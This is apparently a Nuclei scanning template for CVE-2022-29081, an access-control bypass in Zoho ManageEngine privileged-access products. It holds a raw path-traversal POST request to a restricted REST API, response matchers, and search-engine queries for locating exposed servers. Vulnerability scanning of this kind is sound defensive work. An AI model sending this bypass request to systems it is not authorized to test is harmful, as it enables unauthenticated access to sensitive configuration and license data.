id: CVE-2022-29081

info:
  name: Zoho ManageEngine - Access Control Bypass
  author: princechaddha
  severity: high
  description: |
    Zoho ManageEngine Access Manager Plus before build 4302, Password Manager Pro before build 12007, and PAM360 before build 5401 contain an access-control bypass vulnerability caused by insecure handling of '../RestAPI' substring in REST API URLs. An unauthenticated remote attacker can exploit this by using URLs like '/x/../RestAPI/' to bypass API restrictions and access sensitive REST API endpoints. This allows attackers to restart the server, create certificate files to exhaust filesystem space, and view restricted information including license details.
  impact: |
    Successful exploitation allows unauthenticated attackers to access restricted REST APIs, potentially leading to server restart (DoS), filesystem exhaustion via certificate creation, and unauthorized access to sensitive configuration and license information.
  remediation: |
    Upgrade to ManageEngine Access Manager Plus build 4302 or later, Password Manager Pro build 12007 or later, or PAM360 build 5401 or later.
  reference:
    - https://www.tenable.com/security/research/tra-2022-14
    - https://www.manageengine.com/privileged-session-management/release-notes.html
    - https://nvd.nist.gov/vuln/detail/CVE-2022-29081
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
    cvss-score: 8.6
    cve-id: CVE-2022-29081
    cwe-id: CWE-284
    cpe: cpe:2.3:a:zohocorp:manageengine_access_manager_plus:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: zohocorp
    product: manageengine_access_manager_plus
    shodan-query: http.title:"manageengine"
    fofa-query: title="manageengine"
    google-query: intitle:"manageengine"
  tags: cve,cve2022,manageengine,zoho,auth-bypass,unauth,zohocorp,vuln

http:
  - raw:
      - |
        POST /x/..//RestAPI/LicenseMgr HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        operation=getLicenseDetails

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "BUILD_NO"
          - "LICENSE_TO"
          - "PRODUCT_NAME"
        condition: and

      - type: word
        part: body
        words:
          - "ManageEngine"
          - "AccessManagerPlus"
        condition: or
# digest: 4a0a00473045022100b8c9d4e7f2a1c3b5d8e6f9a2c4b7d9e1f3a5c7b9d1e3f5a7c9b1d3e5f7a9c1b3d5022046a2c4b6d8e0f2a4c6b8d0e2f4a6c8b0d2e4f6a8c0b2d4e6f8a0c2b4d6e8f0a2c4:922c64590222798bb761d5b6d8e72950
